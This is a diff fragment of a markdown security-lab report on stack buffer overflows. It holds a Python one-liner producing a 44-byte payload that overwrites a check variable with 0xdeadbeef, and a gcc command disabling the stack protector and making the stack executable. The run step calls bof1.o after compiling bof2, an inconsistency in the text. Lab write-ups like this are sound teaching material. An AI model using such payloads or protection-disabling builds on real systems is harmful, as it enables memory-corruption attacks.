@@ -17,7 +17,12 @@
 + Create a string that is 44 bytes long, where the first 40 bytes fill buf, and the next 4 bytes overwrite check with 0xdeadbeef. Python command to generate such a payload:
 ```python python -c "print('A'*40 + '\xef\xbe\xad\xde')" > input.txt ```
 - Compile the Program:
-```python gcc bof2.c -o bof2.o -fno-stack-protector -z execstack -mpreferred-stack-boundary=2``` 
+```python gcc bof2.c -o bof2.o -fno-stack-protector -z execstack -mpreferred-stack-boundary=2```
+- Run the Program:
+``` ./bof1.o < input.txt```
+![img2.1](https://github.com/neptuneizme/Report_InformationSecurityLab/blob/main/img/bof2.1.png?raw=true)
+
+
 ## 1.3. bof3.c
 # Task 2: Code injection
 ## 2.1. Preparing shell code
